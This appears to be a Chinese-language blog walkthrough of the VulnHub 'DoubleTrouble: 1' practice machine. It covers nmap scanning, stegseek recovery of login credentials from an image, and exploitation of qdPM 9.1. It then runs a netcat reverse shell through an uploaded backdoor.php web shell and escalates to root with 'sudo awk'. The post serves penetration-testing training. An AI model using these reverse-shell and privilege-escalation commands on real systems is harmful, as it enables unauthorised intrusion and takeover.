---
title: DOUBLETROUBLE: 1靶场实战
url: https://mp.weixin.qq.com/s/lksrrlQa7i43nNHaoarxHg
source: Doonsec's feed
date: 2026-07-16
fetch_date: 2026-07-17T04:58:07.047759
---

# DOUBLETROUBLE: 1靶场实战

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Ye59icdBwNna6MIcWjrmyVsh6RicdpibI15ic0FNPJcIXrkH9NLIKr2bPic9OibJJ1wgcCictiahgfTASffHo29ITse15W4fial3ibfiaxT1bHoF57gQ5A/0?wx_fmt=jpeg)

# DOUBLETROUBLE: 1靶场实战

Mc
Mc

渗透笔记

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

**靶场下载地址：**

```
https://download.vulnhub.com/doubletrouble/doubletrouble.ova
```

**信息搜集**

![图片](https://mmbiz.qpic.cn/mmbiz_png/5CrpKgE0mAyYl0ZcvsNOT2JJ0WcMncy7iaEhtXzPEcIwAOrFpNvZ0DsS0OiazTaJib54SQmJF0WkISWvUGFHuA5JQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp#imgIndex=0)

********一、Nmap进行扫描********

```
arp-scan -lnmap -sP 192.168.204.0/24  #对自己的靶机网段进行存活探测，获取靶机地址nmap -T4 -A -p- 192.168.204.135  #对目标进行全端口扫描通过目录扫描发现目标开放了80、22端口对目标web服务进行目录扫描
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ye59icdBwNnZtgKWXR3icicfymuKQn9e0ic1fMBhzHvAMbf0sjSaY1nWD4t8znhibnvibQzmDTdpINqhr9HqGf0ib6kp0U5y6mACs61nWwJc6T1MXQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ye59icdBwNnYWJCicbkCGP2BdibVicpgdicZmfb75uERFT8RdFVDTAEs5BqeMjrVLGnRX21ep5bERawey6xz6rIPAQhVU89I566ldiadYqeAYBHBk/640?wx_fmt=png&from=appmsg)

```
通过查看扫描到的目录发现存在一个图片http://192.168.204.135/secret/doubletrouble.jpg
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ye59icdBwNnbbodOHyTfLh6ogVAlcjFjAa6suIUFHZfRiaUcwSwibcGZpZDZQ7j6lkoO71tw6mNfra4zYXt4bURne9hQtECycckgDYSFhGdGlc/640?wx_fmt=png&from=appmsg)

```
通过stegseek查看是否存在隐写stegseek --seed [隐写文件名.jpg]stegseek [隐写文件名.jpg] [字典路径.txt]拿到以下信息otisrush@localhost.comotis666
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ye59icdBwNnYVNrdjNg2W9uWIYevfKu2WsWjqlPMhFqFzCqlYbTiaZGHuKNVpdqmC0R7uztickvqibibdPzMn7I2gAiastcxCsn5uUNrhh3bBz6KE/640?wx_fmt=png&from=appmsg)

```
通过访问发现网站使用的是qdpm 9.1
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ye59icdBwNnYvPG6o0jUrwGWIWuRYNL1KicXcooZlX3gQo3iato2ibOGeVYMOFNOj6RB6a6bAribGb8dCWOmdkJQj4fsYTVq6Q7kp0DJrmVtV8EQ/640?wx_fmt=png&from=appmsg)

```
寻找漏洞利用工具进行漏洞利用
```

![](https://mmbiz.qpic.cn/mmbiz_png/Ye59icdBwNnbpppKnU2V0XBxBCHmHULJ3icXic1QScHAozgltNCgMnHBt60rp9zrUd7BGgib7hNbBGef90JY0gOLIMqia9LwibR1UNWWQvHE7ywKs/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Ye59icdBwNnaWgu6hGdlp51icBAx2f7dIEIs1lqnSNbd5311RRODKGkdH6lgFWtp1IMcvLOAqr5KKZr5SUkTicWtlrvEPIukEeoKiaQwib07eAias/640?wx_fmt=png&from=appmsg)

```
本地监听4321端口通过shell执行下面命令反弹shell执行命令：nc%20192.168.204.131%204321%20-e%20%2Fbin%2Fbashhttp://192.168.204.135/uploads/users/369405-backdoor.php?cmd=nc%20192.168.204.131%204321%20-e%20%2Fbin%2Fbash
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ye59icdBwNnZ1r3j4X5mF1SeZB75BEMnwiccoUdjeRJlTW5lUeqV9oNDU5HqiaNNvYBHfLVNZ7fIkGb9ic0CFyc8cjAffW2oCGLv75kYmxZ6CUM/640?wx_fmt=png&from=appmsg)

```
使用下面命令进入交互式shellpython3 -c 'import pty;pty.spawn("/bin/bash")'通过sudo -l发现awk具有无密码验证sudo权限使用sudo awk 'BEGIN {system("/bin/sh")}'进行权限提升
```

![](https://mmbiz.qpic.cn/mmbiz_png/Ye59icdBwNnZpBdR4PYxibxMYSpuHwllIsSxPGxqO1TFQ9H9QcicYnaBU3oGxaAVm7P9kZWN80xt2cmZmEGu5HSORUPZsRZwtGV1R2V0z0nxwE/640?wx_fmt=png&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/5CrpKgE0mAz3gQLial3C9K9LTaqiap0PQKCp30QibbclSpZoW9ZnFXtQB8uVQanvSLiaSAvnicVibEMf4SE3cuVyCl9w/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过